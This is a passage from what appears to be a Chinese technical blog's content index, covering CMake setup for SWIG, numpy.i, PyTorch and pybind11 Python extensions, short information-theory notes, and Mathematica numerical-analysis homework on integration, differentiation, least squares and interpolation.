CUDA::curand)target_link_libraries(KMCUDA OpenMP::OpenMP_CXX)if (PYTHONLIBS_FOUND) include_directories(${PYTHON_INCLUDE_DIRS} ${NUMPY_INCLUDES}) target_link_libraries(KMCUDA ${PYTHON_LIBRARIES})endif()if (R_FOUND) include_directories(${R_INCLUDE_DIRS}) target_link_libraries(KMCUDA ${R_LIBRARIES})endif()if (SUFFIX) set_target_properties(KMCUDA PROPERTIES SUFFIX ${SUFFIX})endif() 使用正确的 Conda 环境 由于 Conda 的实现方式, 不能通过在 CMakeLists.txt 中调用 conda 命令来设置 Python 环境 1. 需要先在终端中激活 Conda 环境 12conda activate my_envcmake ... 如果使用 Visual Studio Code 的 CMake Tools 插件, 似乎 environmentSetupScript 选项存在问题, 在 Windows 上指定该选项似乎会被 visualStudio 选项 (用与加载 Visual Studio 的 vcvarsall.bat) 覆盖, 从而无法加载 Conda 环境. 一种方法是先关闭所有的 VSCoda 窗口, 然后再在终端中使用 12conda activate my_envcode . 来打开已具有正确 Python 环境的 VSCode 窗口, 并使用此拓展进行 CMake Configure. 通过 Python 解释器查找 Numpy 头文件 12345find_package(PythonInterp 3 REQUIRED)find_package(PythonLibs 3 REQUIRED)if (NOT NUMPY_INCLUDES) execute_process(COMMAND ${PYTHON_EXECUTABLE} -c \"import numpy; print(numpy.get_include())\" OUTPUT_VARIABLE NUMPY_INCLUDES)endif() 无需手动设置 NUMPY_INCLUDES 变量. Numpy 的 C 接口只含有头文件, 此后只需要 1include_directories(${PYTHON_INCLUDE_DIRS} ${NUMPY_INCLUDES}) 另外, 1find_package(PythonLibs 3 REQUIRED) 通常能正确查找到 PYTHON_INCLUDE_DIRS 变量. 如果查找失败, 可以使用 下面的方法 使用 SWIG 和 Numpy.i https://www.swig.org/https://www.swig.org/ SWIG 用于生成 C++ 的 Python 接口, 能生成将 C++ 类和 STL 容器翻译为 Python 类和容器的胶水代码. 这个仓库 实现了通过 SWIG, 在 Python 代码中操作 C++ 类并传递 Numpy 数组. 也实现了在 C++ 代码中链接并调用 PyTorch 实现 CUDA 加速. 然而, 这个配置文件没有实现直接向 C++ 代码传递 PyTorch Tensor. 完整 CMakeLists.txt123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103cmake_minimum_required(VERSION 3.14.0)project(libzerogomoku)# optionoption(WRAP_LIB \"wrap library\" ON)option(UNIT_TEST \"unit test\" OFF)set(CMAKE_CXX_STANDARD 14)# ----------------- pytorch -----------------if (NOT TORCH_CMAKE_PATH) # run python and read pytorch cmake path execute_process(COMMAND python -c \"import torch; print(torch.utils.cmake_prefix_path)\" OUTPUT_VARIABLE TORCH_CMAKE_PATH OUTPUT_STRIP_TRAILING_WHITESPACE) # cache TORCH_CMAKE_PATH set(TORCH_CMAKE_PATH ${TORCH_CMAKE_PATH} CACHE PATH \"TORCH_CMAKE_PATH\")endif()message(STATUS \"TORCH_CMAKE_PATH: ${TORCH_CMAKE_PATH}\")set(CMAKE_PREFIX_PATH ${TORCH_CMAKE_PATH})message(STATUS \"CMAKE_PREFIX_PATH: ${CMAKE_PREFIX_PATH}\")# suppress warning C4624 when using msvcif(MSVC) add_compile_options(/wd4624)endif()# find torchfind_package(Torch REQUIRED)# ----------------- swig -----------------# find swigfind_package(SWIG REQUIRED)include(${SWIG_USE_FILE})# ----------------- python -----------------# find pythonfind_package(Python 3.6 REQUIRED)# run python and read python include pathexecute_process(COMMAND python -c \"from distutils.sysconfig import get_python_inc; print(get_python_inc())\" OUTPUT_VARIABLE Python_INCLUDE_DIRS OUTPUT_STRIP_TRAILING_WHITESPACE)message(STATUS \"Python_INCLUDE_DIRS: ${Python_INCLUDE_DIRS}\")include_directories(${Python_INCLUDE_DIRS})# if PYTHON_LIBRARIES is defined, use itif(PYTHON_LIBRARIES) set(Python_LIBRARIES ${PYTHON_LIBRARIES})endif()# if Python_LIBRARIES is not found, warn userif(NOT Python_LIBRARIES) message(WARNING \"Python_LIBRARIES not found, please set it manually\")endif()message(STATUS \"Python_LIBRARIES: ${Python_LIBRARIES}\")add_compile_definitions(SWIG_PYTHON_INTERPRETER_NO_DEBUG)# ----------------- numpy -----------------# run python and get numpy include pathexecute_process(COMMAND python -c \"import numpy; print(numpy.get_include())\" OUTPUT_VARIABLE NUMPY_INCLUDE_DIRS OUTPUT_STRIP_TRAILING_WHITESPACE)message(STATUS \"NUMPY_INCLUDE_DIRS: ${NUMPY_INCLUDE_DIRS}\")include_directories(${NUMPY_INCLUDE_DIRS})# download numpy.i if not foundif(EXISTS \"lib/numpy.i\") message(STATUS \"numpy.i found\")else() message(STATUS \"numpy.i not found, downloading...\") file(DOWNLOAD https://raw.githubusercontent.com/numpy/numpy/master/tools/swig/numpy.i lib/numpy.i)endif()# add sourcesinclude_directories(./src)include_directories(\"${CMAKE_CURRENT_BINARY_DIR}/lib\")aux_source_directory(./src SOURCES)# swigif(WRAP_LIB) set_property(SOURCE ./src/libzerogomoku.i PROPERTY CPLUSPLUS ON) swig_add_library(libzerogomoku TYPE SHARED LANGUAGE python SOURCES ./src/libzerogomoku.i ${SOURCES}) swig_link_libraries(libzerogomoku ${Python_LIBRARIES} ${TORCH_LIBRARIES}) # The following code block is suggested to be used on Windows. # According to https://github.com/pytorch/pytorch/issues/25457, # the DLLs need to be copied to avoid memory errors. # if (WIN32) # file(GLOB TORCH_DLLS \"${TORCH_INSTALL_PREFIX}/lib/*.dll\") # add_custom_command(TARGET _libzerogomoku # POST_BUILD # COMMAND ${CMAKE_COMMAND} -E copy_if_different # ${TORCH_DLLS} # $&lt;TARGET_FILE_DIR:_libzerogomoku&gt;) # endif (WIN32)endif()# unit testif(UNIT_TEST) add_library(test_lib ${SOURCES}) target_link_libraries(test_lib ${TORCH_LIBRARIES}) add_executable(thread_pool_test ./test/thread_pool_test.cpp) target_link_libraries(thread_pool_test test_lib) add_executable(gomoku_test ./test/gomoku_test.cpp) target_link_libraries(gomoku_test test_lib) add_executable(libtorch_test ./test/neural_network_test.cpp) target_link_libraries(libtorch_test test_lib) add_executable(mcts_test ./test/mcts_test.cpp) target_link_libraries(mcts_test test_lib)endif() 编写 SWIG 接口 可以通过 pip 安装 SWIG 到命令行 1pip install swig SWIG 将 .i 文件展开成胶水 C++ 代码. https://github.com/Duanyll/alpha-zero-gomoku/blob/b05f3327f28e8e0b1a4088536aae23d5c66d54d4/src/libzerogomoku.ihttps://github.com/Duanyll/alpha-zero-gomoku/blob/b05f3327f28e8e0b1a4088536aae23d5c66d54d4/src/libzerogomoku.i 12345678%module(threads=\"1\") libzerogomoku%{#define SWIG_FILE_WITH_INIT#include \"gomoku.h\"#include \"neural_network.h\"#include \"mcts.h\"%} 被百分号大括号包围的 C++ 代码不会被 SWIG 解析. 这将在胶水代码中包含这些头文件. 12%include \"gomoku.h\"%include \"mcts.h\" %include 指令让 SWIG 解析头文件中的 C++ 函数与类等声明, 生成胶水代码. 需要注意, SWIG 只支持有限的 C++ 语法, 不要使用复杂的 C++ 语法. 如果 SWIG 无法解析某个头文件中的语法, 可以不引用头文件, 而是直接在 SWIG 文件中编写简化的 C++ 声明. 123456789%include \"std_vector.i\"namespace std { %template(IntVector) vector&lt;int&gt;; %template(IntVectorVector) vector&lt;vector&lt;int&gt;&gt;; %template(DoubleVector) vector&lt;double&gt;; %template(DoubleVectorVector) vector&lt;vector&lt;double&gt;&gt;; %template(CharVector) vector&lt;char&gt;;}%include \"std_string.i\" 引入一些 STL 类型的支持. 需要为 STL 模版类型设置别名. 为 SWIG 接口添加 Numpy 支持 https://numpy.org/doc/stable/reference/swig.interface-file.htmlhttps://numpy.org/doc/stable/reference/swig.interface-file.html Numpy 提供对 SWIG 的支持, 可以不在 C 代码中引用 Numpy 的头文件, 而是让 SWIG 把 Numpy 数组对象转换成特定的 C 函数原型 (参数中包含指向数据的裸指针和数组长度). 需要在 SWIG 接口文件中引入 numpy.i 并选择需要转换的原型 12%include \"numpy.i\"%apply (int DIM1, int DIM2, int* INPLACE_ARRAY2) {(int dim1, int dim2, int *data)}; 之后具有 (int dim1, int dim2, int *data) 参数列表的函数就可以接受可就地修改的 numpy 二维数组. 更多的原型可在 这里 查找. 12345%{ static struct InitNumpy { InitNumpy() { _import_array(); } } _init_numpy;%} 在接口胶水代码中插入这段代码, 并保证 _import_array() 函数只被调用一次 2. 这个函数将会设置 Numpy 函数调用的基地址. 在 CMake 中使用 SWIG 需要获得 Numpy 的包含文件目录 1234# run python and get numpy include pathexecute_process(COMMAND python -c \"import numpy; print(numpy.get_include())\" OUTPUT_VARIABLE NUMPY_INCLUDE_DIRS OUTPUT_STRIP_TRAILING_WHITESPACE)message(STATUS \"NUMPY_INCLUDE_DIRS: ${NUMPY_INCLUDE_DIRS}\")include_directories(${NUMPY_INCLUDE_DIRS}) 下面的代码自动下载 numpy.i 1234567# download numpy.i if not foundif(EXISTS \"lib/numpy.i\") message(STATUS \"numpy.i found\")else() message(STATUS \"numpy.i not found, downloading...\") file(DOWNLOAD https://raw.githubusercontent.com/numpy/numpy/master/tools/swig/numpy.i lib/numpy.i)endif() 并需要把下载的 numpy.i 添加到包含目录 1include_directories(\"${CMAKE_CURRENT_BINARY_DIR}/lib\") 查找 SWIG. FindSwig 是 CMake 自带的. 123# find swigfind_package(SWIG REQUIRED)include(${SWIG_USE_FILE}) 使用专门的函数声明 SWIG 库文件和静态链接 123set_property(SOURCE ./src/libzerogomoku.i PROPERTY CPLUSPLUS ON)swig_add_library(libzerogomoku TYPE SHARED LANGUAGE python SOURCES ./src/libzerogomoku.i ${SOURCES})swig_link_libraries(libzerogomoku ${Python_LIBRARIES} ${TORCH_LIBRARIES}) 通过 Python 解释器查找 Python 头文件 123456789101112131415# find pythonfind_package(Python 3.6 REQUIRED)# run python and read python include pathexecute_process(COMMAND python -c \"from distutils.sysconfig import get_python_inc; print(get_python_inc())\" OUTPUT_VARIABLE Python_INCLUDE_DIRS OUTPUT_STRIP_TRAILING_WHITESPACE)message(STATUS \"Python_INCLUDE_DIRS: ${Python_INCLUDE_DIRS}\")include_directories(${Python_INCLUDE_DIRS})# if PYTHON_LIBRARIES is defined, use itif(PYTHON_LIBRARIES) set(Python_LIBRARIES ${PYTHON_LIBRARIES})endif()# if Python_LIBRARIES is not found, warn userif(NOT Python_LIBRARIES) message(WARNING \"Python_LIBRARIES not found, please set it manually\")endif()message(STATUS \"Python_LIBRARIES: ${Python_LIBRARIES}\") FindPython 经常找不到 Python_INCLUDE_DIRS, 这时可以通过 Python 解释器查找. 使用 PyTorch 和 pybind11 很遗憾, PyTorch 的 C++ 接口的 API 文档十分简略. 将就着猜猜怎么用吧! 完整 CMakeLists.txt1234567891011121314151617181920212223242526272829303132333435363738cmake_minimum_required (VERSION 3.21)set (CMAKE_CXX_STANDARD 14)set (CMAKE_CXX_STANDARD_REQUIRED ON)set (CMAKE_CUDA_STANDARD 14)set (CMAKE_CUDA_STANDARD_REQUIRED ON)project (\"ConvByCluster\" LANGUAGES CXX CUDA)if (MSVC) # suppress C4624 set (CMAKE_CXX_FLAGS \"${CMAKE_CXX_FLAGS} /wd4624\")endif()find_package(PythonInterp 3 REQUIRED)find_package(PythonLibs 3 REQUIRED)execute_process(COMMAND ${PYTHON_EXECUTABLE} -c \"import torch; print(torch.utils.cmake_prefix_path)\" OUTPUT_VARIABLE PYTORCH_CMAKE_PREFIX_PATH OUTPUT_STRIP_TRAILING_WHITESPACE)list(APPEND CMAKE_PREFIX_PATH \"${PYTORCH_CMAKE_PREFIX_PATH}/Torch\")message(\"PYTORCH_CMAKE_PREFIX_PATH ${PYTORCH_CMAKE_PREFIX_PATH}\")message(\"CMAKE_PREFIX_PATH ${CMAKE_PREFIX_PATH}\")find_package(Torch REQUIRED)find_library(TORCH_PYTHON_LIBRARY torch_python PATHS \"${TORCH_INSTALL_PREFIX}/lib\")message(\"TORCH_LIBRARIES: ${TORCH_LIBRARIES}\")message(\"TORCH_PYTHON_LIBRARY: ${TORCH_PYTHON_LIBRARY}\")message(\"CMAKE_CUDA_FLAGS: ${CMAKE_CUDA_FLAGS}\")message(\"CUDA_NVCC_FLAGS: ${CUDA_NVCC_FLAGS}\")include_directories(${PYTHON_INCLUDE_DIRS})add_library(conv_by_cluster SHARED \"kernel.cpp\")target_link_libraries(conv_by_cluster ${PYTHON_LIBRARIES} ${TORCH_LIBRARIES} ${TORCH_PYTHON_LIBRARY})target_compile_definitions(conv_by_cluster PRIVATE TORCH_EXTENSION_NAME=conv_by_cluster) 在 C++ 中调用 PyTorch 确保已在 Python 环境中安装 torch, 即可通过 Python 解释器找到 PyTorch 库 12345execute_process(COMMAND ${PYTHON_EXECUTABLE} -c \"import torch; print(torch.utils.cmake_prefix_path)\" OUTPUT_VARIABLE PYTORCH_CMAKE_PREFIX_PATH OUTPUT_STRIP_TRAILING_WHITESPACE)list(APPEND CMAKE_PREFIX_PATH \"${PYTORCH_CMAKE_PREFIX_PATH}/Torch\")message(\"PYTORCH_CMAKE_PREFIX_PATH ${PYTORCH_CMAKE_PREFIX_PATH}\")message(\"CMAKE_PREFIX_PATH ${CMAKE_PREFIX_PATH}\")find_package(Torch REQUIRED) FindTorch 已经把 PyTorch 的头文件添加到包含目录中, 还需要静态链接 TORCH_LIBRARIES 1234target_link_libraries(conv_by_cluster ${PYTHON_LIBRARIES} ${TORCH_LIBRARIES}) 这样, 在 C++ 代码中 123456#include &lt;torch/torch.h&gt;int main() { torch::Tensor tensor = torch::rand({2, 3}).to(torch::kCUDA); std::cout &lt;&lt; tensor &lt;&lt; std::endl;} 即可使用 PyTorch. 添加 pybind11 导出 PyTorch 的包含文件中已经引用了 pybind11. 还需要额外静态链接一个库 1234567find_library(TORCH_PYTHON_LIBRARY torch_python PATHS \"${TORCH_INSTALL_PREFIX}/lib\")target_link_libraries(conv_by_cluster ${PYTHON_LIBRARIES} ${TORCH_LIBRARIES} ${TORCH_PYTHON_LIBRARY}) 在 C++ 代码中 12345678910111213141516#include &lt;torch/extension.h&gt;// ...torch::Tensor Test_forward_cpu(const torch::Tensor &amp;x, const torch::Tensor &amp;y) { // ...}std::vector&lt;torch::Tensor&gt; Test_backward_cpu(const torch::Tensor &amp;gradOutput) { // ...}PYBIND11_MODULE(TORCH_EXTENSION_NAME, m) { m.def(\"forward\", &amp;Test_forward_cpu, \"Test forward\"); m.def(\"backward\", &amp;Test_backward_cpu, \"Test backward\");} 需要添加定义 1target_compile_definitions(conv_by_cluster PRIVATE TORCH_EXTENSION_NAME=conv_by_cluster) 使得 PYBIND11_MODULE 生成的 PyInit_xxx 函数调用名称和可执行文件名相同. 另外, 在 Windows 上, 需要把 .dll 后缀重命名为 .pyd 才能用 1from conv_by_cluster import forward, backward 引入. 解决动态链接问题 在 Windows 上, 如果生成了调用 PyTorch 的可执行文件, 可能需要把 PyTorch 使用的各种动态链接库复制到可执行文件目录 1234567891011# The following code block is suggested to be used on Windows.# According to https://github.com/pytorch/pytorch/issues/25457,# the DLLs need to be copied to avoid memory errors.if (WIN32) file(GLOB TORCH_DLLS \"${TORCH_INSTALL_PREFIX}/lib/*.dll\") add_custom_command(TARGET _libzerogomoku POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different ${TORCH_DLLS} $&lt;TARGET_FILE_DIR:_libzerogomoku&gt;)endif (WIN32) 才能正常运行. 如果是生成了 pybind11 接口库, 则不需要这么做, 应当在 Python 代码中先引入 PyTorch 再引入拓展库. 12import torchfrom conv_by_cluster import forward, backward 如果先引入了拓展库, 容易导致找不到 DLL 或者 DLL 冲突. 另外, 其他的一些 Python CUDA 包, 如 bitsandbytes 等在 Windows 上找不到 cudart, cudnn 等问题都可以尝试先 import torch. PyTorch 会加载这些动态链接库, 而且这些库是内置在 PyTorch 中的, 通常不会找不到. 调试 C++ 代码 使用 Conda 环境时通常不会安装 Python 解释器的调试库 pythonx.xx_d.lib, 通常调试代码时也不需要对 Python 解释器本身进行调试, 然而, 如果定义了 _DEBUG 符号, Python.h 会强制通过 #pragma 链接 Python 调试库, 导致链接出错. 3 1234567#ifdef _DEBUG#undef _DEBUG#include &lt;Python.h&gt;#define _DEBUG 1#else#include &lt;Python.h&gt;#endif 在 C++ 代码对 Python.h 暂时取消 _DEBUG 宏. torch/extension.h 引用了 Python.h, 也取消 _DEBUG 1234567#ifdef _DEBUG#undef _DEBUG#include &lt;torch/extension.h&gt;#define _DEBUG 1#else#include &lt;torch/extension.h&gt;#endif SWIG 提供了一个宏定义可实现上面的效果 1add_compile_definitions(SWIG_PYTHON_INTERPRETER_NO_DEBUG) 使用 VSCode 调试从 Python 调用的 C++ 代码, 可以使用附加启动功能. 在 launch.json 中添加配置 123456{ \"name\": \"(Windows) 附加\", \"type\": \"cppvsdbg\", \"request\": \"attach\", \"processId\": \"${command:pickProcess}\"} 先启动 Python 解释器 (可以附加 Python 调试器). 使用 1import os; print(os.getpid()) 查看 PID, 不要结束 Python 调试, 启动 C++ 调试附加到该进程, 即可命中 C++ 代码中的断点. https://discourse.cmake.org/t/create-and-activate-python-conda-environment-with-cmake/5777↩︎ 通常也不会多次调用它, 其他部分的 C++ 代码都不需要引用 Numpy 的头文件↩︎ 这个调试库通过 pragma 引入, 在 CMake 生成的项目文件中并没有引用, 很难排查↩︎","tags":["vscode","炼丹","python","pytorch","cmake","指北"],"categories":["技术"]},{"title":"信息论速通","path":"/2023/6/26/Information/","content":"计算 信源熵 离散信源熵的性质 熵非负 熵对信源概率 严格上凸. 是概率测度 最大熵定理: 达到最大熵 时信源概率平均分布 连续信源差熵性质 不一定非负 仍满足严格上凸 最大熵定理: 限定均值为 , 方差 (平均功率) 为 , 最大差熵为 信源概率密度为正态分布 无失真压缩编码 异前置码的克拉夫特不等式: 二元异前置码的码长 满足 表明具有渐进最优性 费诺码: 按概率从大到小排序, 尽量二分 霍夫曼码: 从小到大排序, 每次把最小的捏起来 平均互信息 互信息量 噪声熵 损失熵 平均互信息 离散平均互信息性质 对称 非负 对信源概率严格上凸 对信道转移概率严格下凸 连续平均互信息性质 对称 对信源概率严格上凸 对信道转移概率严格下凸 极值不一定存在 信道容量: 改变信源概率能取得的最大平均互信息 次拓展对称信道 (每一行都是 的排列) 次拓展高斯信道: 加性高斯噪声, 平均功率 采样定理: 不失真传输一条消息（ 个符号）的最小时间, 带宽 香农公式: 单位时间的信道容量. 单边功率谱密度 纠错编码 线性分组码 汉明码 率失真函数 平均失真度: 失真度的数学期望 保真度准则: 平均失真度不大于允许失真 试验信道: 满足保真度准则的数据处理信道 率失真函数: 满足保真度准则, 改变试验信道, 能取得的最小平均互信息 次扩展等概率信源 转移概率 次扩展二元信源 次扩展高斯信源: 取平方误差度. G711 Law A 证明 熵对信源概率严格上凸 马尔科夫信源 高斯信源熵最大 香农第一定理 渐进均分性 (弱大数定理): 典型序列的码率接近熵率 典型序列的概率足够大 典型序列的数量足够多 译码错误概率足够低 克拉夫特不等式证明异前置码渐进最优 互信息量对称 (贝叶斯公式) 香农第二定理","tags":["信息论"],"categories":["课程"]},{"title":"数值分析作业 - 数值积分","path":"/2023/5/27/Numeric-10/","content":"Problem 1 对一次多项式 二次多项式 则代数精度是 1. Problem 2 使用待定系数法: Problem 3 则需要确定二次多项式 使其在 与任意次数少于一的多项式正交. 则 的零点为 则二点 Gauss 积分直接得到了精确值. Problem 4 定义四种积分算法 1234567891011121314151617181920212223242526centerIntergral[f_, a_, b_, m_] := Module[{\\[CapitalDelta]h}, \\[CapitalDelta]h = (b - a)/m; Return[\\[CapitalDelta]h Sum[ f[a + \\[CapitalDelta]h/2 + i \\[CapitalDelta]h], {i, 0, m - 1}]]; ];trapezoidIntergral[f_, a_, b_, m_] := Module[{\\[CapitalDelta]h}, \\[CapitalDelta]h = (b - a)/m; Return[\\[CapitalDelta]h/ 2 (f[a] + f[b] + 2 Sum[f[a + i \\[CapitalDelta]h], {i, 1, m - 1}])]; ];simpsonIntergral[f_, a_, b_, m_] := Module[{\\[CapitalDelta]h}, \\[CapitalDelta]h = (b - a)/m; Return[\\[CapitalDelta]h/ 6 (f[a] + f[b] + 2 Sum[f[a + i \\[CapitalDelta]h], {i, 1, m - 1}] + 4 Sum[f[a + \\[CapitalDelta]h/2 + i \\[CapitalDelta]h], {i, 0, m - 1}])]; ];gauss3IntegralSegment[f_, a_, b_] := (b - a)/ 2 (5/9 f[(a + b)/2 - (a - b)/2 Sqrt[3/5]] + 8/9 f[(a + b)/2] + 5/9 f[(a + b)/2 + (a - b)/2 Sqrt[3/5]]);gauss3Integral[f_, a_, b_, m_] := Sum[gauss3IntegralSegment[f, a + (b - a)/m i, a + (b - a)/m (i + 1)], {i, 0, m - 1}]; 正确积分值是 , 保留 20 位有效数字的工作精度. 12345f[x_] = N[x E^x, 20];a = 0;b = 1;m = {1, 2, 4, 8, 16, 32};real = Integrate[f[x], {x, a, b}] 用四种方法和不同积分区间数量求解积分 12345678TableForm[ Transpose[ Map[Table[ ScientificForm[1 - #[f, a, b, 2^i], 5], {i, 0, 5}] &amp;, {centerIntergral, trapezoidIntergral, simpsonIntergral, gauss3Integral}]], TableHeadings -&gt; {Table[2^i, {i, 0, 5}], {\"center\", \"trapezoid\", \"simpson\", \"gauss\"}}] // TeXForm 能注意到不同方法的误差都随着区间划分增多而减少, 相同积分区间数量时, 四种方法的误差依次减小. Problem 5 12345678910111213141516romberg[f_, a_, b_, n_] := Module[{\\[CapitalDelta]h, r}, \\[CapitalDelta]h = b - a; r = {{\\[CapitalDelta]h/2 (f[a] + f[b])}}; Do[ \\[CapitalDelta]h /= 2; AppendTo[r, ConstantArray[0, j]]; r[[j, 1]] = 1/2 r[[j - 1, 1]] + \\[CapitalDelta]h Sum[ f[a + (2 i - 1) \\[CapitalDelta]h], {i, 1, 2^(j - 2)}]; Do[ r[[j, k]] = (4^(k - 1) r[[j, k - 1]] - r[[j - 1, k - 1]])/( 4^(k - 1) - 1); , {k, 2, j}] , {j, 2, n}]; Return[r]; ]; 计算误差 12TableForm[Map[ScientificForm[#, 5] &amp;, 1 - romberg[f, a, b, 5], {2}], TableHeadings -&gt; {Range[1, 5], Range[1, 5]}] // TeXForm","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 数值微分","path":"/2023/5/17/Numeric-9/","content":"Problem 1 则误差 是 的二阶近似. 使用 Richardson 外推法, 得到 至少是 的三阶近似. Problem 2 Taylor 展开 则有 解得 即 Problem 3 1234f[x_] = E^x;f1[x_, h_] = (f[x - 2 h] - 4 f[x - h] + 3 f[x])/(2 h);f2[x_, h_] = -(1/(12 h^2)) f[x - 2 h] + 4/(3 h^2) f[x - h] - 5/(2 h^2) f[x] + 4/(3 h^2) f[x + h] - 1/(12 h^2) f[x + 2 h]; 求一阶导数的误差: 1err1 = Table[1 - N[f1[0, 10^-i], 20], {i, 1, 9}] 1ListLogPlot[err1] 可以观察到误差大约满足二次收敛. 求二阶导数的误差: 1err2 = Table[1 - N[f2[0, 10^-i], 40], {i, 1, 9}] 1ListLogPlot[err2] 可以观察到误差大约满足四次收敛.","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 数据拟合与最小二乘","path":"/2023/5/15/Numeric-8/","content":"Problem 1 12data = {{0, 0}, {1/6, 2}, {1/3, 0}, {1/2, -1}, {2/3, 1}, {5/6, 1}};FindFit[data, c1 + c2 Cos[2 Pi t] + c3 Sin[2 Pi t], {c1, c2, c3}, t] 拟合结果: 1{c1 -&gt; 0.5, c2 -&gt; 0.666667, c3 -&gt; 5.59057*10^-17} 直观看来拟合的效果并不好. Problem 2 法线方程 QR 分解 误差: Problem 3 1234x = N[Range[2, 4, 1/20]];y = Table[Sum[x[[i]]^n, {n, 0, 10}], {i, 1, 21}];a = Table[Table[x[[i]]^n, {n, 0, 10}], {i, 1, 21}];c1 = LinearSolve[a\\[Transpose] . a, a\\[Transpose] . y] Mathematica 给出了结果矩阵条件数大的警告, 结果误差很大: 1234{-254.73969572312623, 599.4456193346913, -509.47962931201255,152.30017046791227, 25.032793385407892, -5.826484122391565,-19.333172789690796, 15.234395579446103, -3.166448346905615,1.5966670929604954, 0.965552733160666} 12{q, r} = QRDecomposition[a];c2 = LinearSolve[r, q . y] Mathematica 给出了结果矩阵条件数大的警告, 但从结果看误差比法线方程小 1234{0.9929717426864622, 1.0281267330856911, 0.9494600502108924,1.0536955622829947, 0.962645407944824, 1.0177797956147965,0.9941361511581496, 1.0013231833104463, 0.9998044906382084,1.0000170811018925, 0.9999993299217007}","tags":["数值分析"],"categories":["课程"]},{"title":"数值分析作业 - 插值","path":"/2023/4/28/Numeric-7/","content":"Problem 1 Lagrange 插值: Newton 插值: 插值的结果是相同的. Problem 2 Problem 3 Problem 4 下面的 Mathematica 程序给定插值点和函数值, 计算 Newton 差商矩阵的第一行 并借此求出插值函数 123456789101112131415newtonCoeffcient[xi_?ListQ, fi_?ListQ] := Module[{a, n, c}, ( n = Length[xi]; a = fi; c = ConstantArray[0, n]; c[[1]] = a[[1]]; Do[( Do[ a[[j]] = (a[[j + 1]] - a[[j]])/(xi[[i + j]] - xi[[j]]), {j, 1, n - i}]; c[[i + 1]] = a[[1]]; ), {i, 1, n - 1}]; Return[c]; )];newtonValue[xi_?ListQ, a_?ListQ, x_] := Fold[#2[[2]] + (x - #2[[1]]) #1 &amp;, 0, Reverse[Transpose[{xi, a}]]]; 先使用 Mathematica 内置的 InterpolatingPolynomial 计算插值多项式 1234xi = {0, \\[Pi]/6, \\[Pi]/3, \\[Pi]/4, \\[Pi]/2};fi = Sin[xi];pStd = InterpolatingPolynomial[Transpose[{xi, fi}], x] // Expand;pStd // TeXForm 再使用 Newton 法计算 12cNewton = newtonCoeffcient[xi, fi] // Simplify;cNewton // TeXForm 12pNewton = newtonValue[xi, cNewton, x] // Expand;pNewton // TeXForm 得到的结果与内置函数完全一致. 将给定点直接代入插值函数求近似值, 在 以外的区域显然存在巨大的误差 12x = N[{1, 2, 3, 4, 14, 1000}];Map[newtonValue[xi, cNewton, #] &amp;, x] // TeXForm 利用三角函数的周期性 12345678910pSin[x_] := Piecewise[{ {newtonValue[xi, cNewton, Mod[x, 2 \\[Pi]]], Mod[x, 2 \\[Pi]] &lt; \\[Pi]/2}, {newtonValue[xi, cNewton, \\[Pi] - Mod[x, 2 \\[Pi]]], Mod[x, 2 \\[Pi]] &lt; \\[Pi]}, {-newtonValue[xi, cNewton, Mod[x, 2 \\[Pi]] - \\[Pi]], Mod[x, 2 \\[Pi]] &lt; (3 \\[Pi])/2}, {-newtonValue[xi, cNewton, 2 \\[Pi] - Mod[x, 2 \\[Pi]]], True} }];Map[pSin, x] // TeXForm 得到的结果是合理的 绝对误差 1Map[pSin, x] - Sin[x] // TeXForm 可以注意到绝对误差均在小数点后三位. 1Plot[pSin[x] - Sin[x], {x, 0, \\[Pi]/2}] Problem 5 定义一些辅助的变量和函数 123456789uniformSample[a_, b_, n_] := Range[a, b, (b - a)/(n - 1)];chebshevSample[a_, b_, n_] := Table[(b - a)/2 Cos[((2 i + 1) \\[Pi])/(2 (n + 1)) + (b + a)/2], {i, 0, n}];f[x_] := 1/(1 + 12 x^2);newton[f_, xi_, x_] := newtonValue[xi, newtonCoeffcient[xi, f[xi]], x] // Expand;l = -2.;r = 2.; 取 进行插值并绘制图像 123456789101112131415Clear[x];GraphicsGrid[ParallelMap[{ Plot[ {f[x], newton[f, uniformSample[l, r, #], x], newton[f, chebshevSample[l, r, #], x]}, {x, l, r}, PlotLegends -&gt; Placed[{\"f[x]\", \"uniform\", \"chebshev\"}, Below], PlotLabel -&gt; \"n=\" &lt;&gt; TextString[#]], Plot[ {f[x] - newton[f, uniformSample[l, r, #], x], f[x] - newton[f, chebshevSample[l, r, #], x]}, {x, l, r}, PlotLegends -&gt; Placed[{\"uniform\", \"chebshev\"}, Below], PlotLabel -&gt; \"Error n=\" &lt;&gt; TextString[#]] } &amp;, {11, 21, 31}]] 注意到, 在中间的 范围内, 两种插值方法得到的函数的形态都接近原函数, 由于均匀方式选取的插值节点更加密集, 在原点附近均匀插值的绝对误差小于 Chebshev 插值. 然而在接近边界区域, 均匀插值方法表现出了明显的震荡现象, 完全不能反映原函数的走向, 而 Chebshev 插值的结果与原函数相比误差较小. Problem 6 实现三次自然样条插值 123456789101112131415161718192021222324252627282930splineCoefficient[xi_?ListQ, fi_?ListQ] := Module[{n, a, \\[Delta], \\[CapitalDelta], m, c, \\[Beta], d, b}, ( n = Length[xi]; a = Drop[fi, -1]; \\[Delta] = Table[xi[[i + 1]] - xi[[i]], {i, 1, n - 1}]; \\[CapitalDelta] = Table[fi[[i + 1]] - fi[[i]], {i, 1, n - 1}]; m = SparseArray[Flatten[{ {1, 1} -&gt; 1, {n, n} -&gt; 1, Table[{{i, i + 1} -&gt; \\[Delta][[i]], {i, i} -&gt; 2 \\[Delta][[i - 1]] + 2 \\[Delta][[i]], {i, i - 1} -&gt; \\[Delta][[i - 1]]}, {i, 2, n - 1}] }], {n, n}]; \\[Beta] = SparseArray[ Table[{i} -&gt; 3 (\\[CapitalDelta][[i]]/\\[Delta][[i]] - \\[CapitalDelta][[i - 1]]/\\[Delta][[i - 1]]), {i, 2, n - 1}], {n}]; c = Normal[LinearSolve[m, \\[Beta]]]; d = Table[(c[[i + 1]] - c[[i]])/( 3 \\[Delta][[i]]), {i, 1, n - 1}]; b = Table[\\[CapitalDelta][[i]]/\\[Delta][[i]] - \\[Delta][[i]]/ 3 (2 c[[i]] + c[[i + 1]]), {i, 1, n - 1}]; c = Drop[c, -1]; Return[Transpose[{Drop[xi, -1], a, b, c, d}]]; )];splineValue[data_, x_] := Module[{a, b, c, d, xi}, ( {xi, a, b, c, d} = SelectFirst[Reverse[data], x &gt;= 